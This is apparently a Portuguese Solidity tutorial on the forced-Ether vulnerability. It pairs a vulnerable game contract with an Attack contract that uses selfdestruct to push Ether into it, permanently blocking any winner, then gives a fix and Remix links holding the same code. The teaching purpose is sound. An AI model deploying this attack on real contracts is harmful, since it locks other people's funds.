# Autodestruição

Os contratos podem ser apagados do blockchain chamando `selfdestruct`.

`selfdestruct` envia todo Ether restante armazenado no contrato para o endereço designado.

</h4><a href="#vulnerability" id="vulnerability">Vulnerabilidade</a></h4>

Um contrato malicioso pode usar `selfdestruct` para forçar o envio de Ether para qualquer contrato.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// A meta deste jogo é ser o 7o. jogador a depositar 1 Ether.
// Jogadores podem depositar somente 1 Ether de cada vez.
// O vencedor será capaz de retirar todo Ether.

/*
1. Implemente EtherGame
2. Jogadores (vamos dizer Alice e Bob) decidem jogar, depositam 1 Ether cada.
2. Implemente Attack com endereço do EtherGame
3. Chame Attack.attack enviando 5 ether. Isso quebrará o jogo.
   Ninguém pode se tornar campeão.

O que aconteceu?
Attack forçou o balanço do EtherGame para 7 ether.
Agora ninguém pode depositar e não se pode estabelecer um campeão.
*/

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // Você pode simplesmente quebrar o jogo enviando ether de forma que
        // o saldo do jogo >= 7 ether

        // lance address a pagar
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}
```

</h4><a href="#preventative-techniques" id="preventative-techniques">Técnicas preventivas</a></h4>

Não confie em `address(this).balance`

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract EtherGame {
    uint public targetAmount = 3 ether;
    uint public balance;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        balance += msg.value;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }
}
```

## Teste no Remix

- [ForceEther.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4xMzsKCi8vIEEgbWV0YSBkZXN0ZSBqb2dvIGUgc2VyIG8gN28uIGpvZ2Fkb3IgYSBkZXBvc2l0YXIgMSBFdGhlci4KLy8gSm9nYWRvcmVzIHBvZGVtIGRlcG9zaXRhciBzb21lbnRlIDEgRXRoZXIgZGUgY2FkYSB2ZXouCi8vIE8gdmVuY2Vkb3Igc2VyYSBjYXBheiBkZSByZXRpcmFyIHRvZG8gRXRoZXIuCgovKgoxLiBJbXBsZW1lbnRlIEV0aGVyR2FtZQoyLiBKb2dhZG9yZXMgKHZhbW9zIGRpemVyIEFsaWNlIGUgQm9iKSBkZWNpZGVtIGpvZ2FyLCBkZXBvc2l0YW0gMSBFdGhlciBjYWRhLgoyLiBJbXBsZW1lbnRlIEF0dGFjayBjb20gZW5kZXJlY28gZG8gRXRoZXJHYW1lCjMuIENoYW1lIEF0dGFjay5hdHRhY2sgZW52aWFuZG8gNSBldGhlci4gSXNzbyBxdWVicmFyYSBvIGpvZ28uCiAgIE5pbmd1ZW0gcG9kZSBzZSB0b3JuYXIgY2FtcGVhby4KCk8gcXVlIGFjb250ZWNldT8KQXR0YWNrIGZvcmNvdSBvIGJhbGFuY28gZG8gRXRoZXJHYW1lIHBhcmEgNyBldGhlci4KQWdvcmEgbmluZ3VlbSBwb2RlIGRlcG9zaXRhciBlIG5hbyBzZSBwb2RlIGVzdGFiZWxlY2VyIHVtIGNhbXBlYW8uCiovCgpjb250cmFjdCBFdGhlckdhbWUgewogICAgdWludCBwdWJsaWMgdGFyZ2V0QW1vdW50ID0gNyBldGhlcjsKICAgIGFkZHJlc3MgcHVibGljIHdpbm5lcjsKCiAgICBmdW5jdGlvbiBkZXBvc2l0KCkgcHVibGljIHBheWFibGUgewogICAgICAgIHJlcXVpcmUobXNnLnZhbHVlID09IDEgZXRoZXIsICJZb3UgY2FuIG9ubHkgc2VuZCAxIEV0aGVyIik7CgogICAgICAgIHVpbnQgYmFsYW5jZSA9IGFkZHJlc3ModGhpcykuYmFsYW5jZTsKICAgICAgICByZXF1aXJlKGJhbGFuY2UgPD0gdGFyZ2V0QW1vdW50LCAiR2FtZSBpcyBvdmVyIik7CgogICAgICAgIGlmIChiYWxhbmNlID09IHRhcmdldEFtb3VudCkgewogICAgICAgICAgICB3aW5uZXIgPSBtc2cuc2VuZGVyOwogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBjbGFpbVJld2FyZCgpIHB1YmxpYyB7CiAgICAgICAgcmVxdWlyZShtc2cuc2VuZGVyID09IHdpbm5lciwgIk5vdCB3aW5uZXIiKTsKCiAgICAgICAgKGJvb2wgc2VudCwgKSA9IG1zZy5zZW5kZXIuY2FsbHt2YWx1ZTogYWRkcmVzcyh0aGlzKS5iYWxhbmNlfSgiIik7CiAgICAgICAgcmVxdWlyZShzZW50LCAiRmFpbGVkIHRvIHNlbmQgRXRoZXIiKTsKICAgIH0KfQoKY29udHJhY3QgQXR0YWNrIHsKICAgIEV0aGVyR2FtZSBldGhlckdhbWU7CgogICAgY29uc3RydWN0b3IoRXRoZXJHYW1lIF9ldGhlckdhbWUpIHsKICAgICAgICBldGhlckdhbWUgPSBFdGhlckdhbWUoX2V0aGVyR2FtZSk7CiAgICB9CgogICAgZnVuY3Rpb24gYXR0YWNrKCkgcHVibGljIHBheWFibGUgewogICAgICAgIC8vIFZvY2UgcG9kZSBzaW1wbGVzbWVudGUgcXVlYnJhciBvIGpvZ28gZW52aWFuZG8gZXRoZXIgZGUgZm9ybWEgcXVlCiAgICAgICAgLy8gbyBzYWxkbyBkbyBqb2dvID49IDcgZXRoZXIKCiAgICAgICAgLy8gbGFuY2UgYWRkcmVzcyBhIHBhZ2FyCiAgICAgICAgYWRkcmVzcyBwYXlhYmxlIGFkZHIgPSBwYXlhYmxlKGFkZHJlc3MoZXRoZXJHYW1lKSk7CiAgICAgICAgc2VsZmRlc3RydWN0KGFkZHIpOwogICAgfQp9&version=soljson-v0.8.13+commit.abaa5c0e.js)
- [PreventForceEther.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4xMzsKCmNvbnRyYWN0IEV0aGVyR2FtZSB7CiAgICB1aW50IHB1YmxpYyB0YXJnZXRBbW91bnQgPSAzIGV0aGVyOwogICAgdWludCBwdWJsaWMgYmFsYW5jZTsKICAgIGFkZHJlc3MgcHVibGljIHdpbm5lcjsKCiAgICBmdW5jdGlvbiBkZXBvc2l0KCkgcHVibGljIHBheWFibGUgewogICAgICAgIHJlcXVpcmUobXNnLnZhbHVlID09IDEgZXRoZXIsICJZb3UgY2FuIG9ubHkgc2VuZCAxIEV0aGVyIik7CgogICAgICAgIGJhbGFuY2UgKz0gbXNnLnZhbHVlOwogICAgICAgIHJlcXVpcmUoYmFsYW5jZSA8PSB0YXJnZXRBbW91bnQsICJHYW1lIGlzIG92ZXIiKTsKCiAgICAgICAgaWYgKGJhbGFuY2UgPT0gdGFyZ2V0QW1vdW50KSB7CiAgICAgICAgICAgIHdpbm5lciA9IG1zZy5zZW5kZXI7CiAgICAgICAgfQogICAgfQoKICAgIGZ1bmN0aW9uIGNsYWltUmV3YXJkKCkgcHVibGljIHsKICAgICAgICByZXF1aXJlKG1zZy5zZW5kZXIgPT0gd2lubmVyLCAiTm90IHdpbm5lciIpOwoKICAgICAgICAoYm9vbCBzZW50LCApID0gbXNnLnNlbmRlci5jYWxse3ZhbHVlOiBiYWxhbmNlfSgiIik7CiAgICAgICAgcmVxdWlyZShzZW50LCAiRmFpbGVkIHRvIHNlbmQgRXRoZXIiKTsKICAgIH0KfQ==&version=soljson-v0.8.13+commit.abaa5c0e.js)
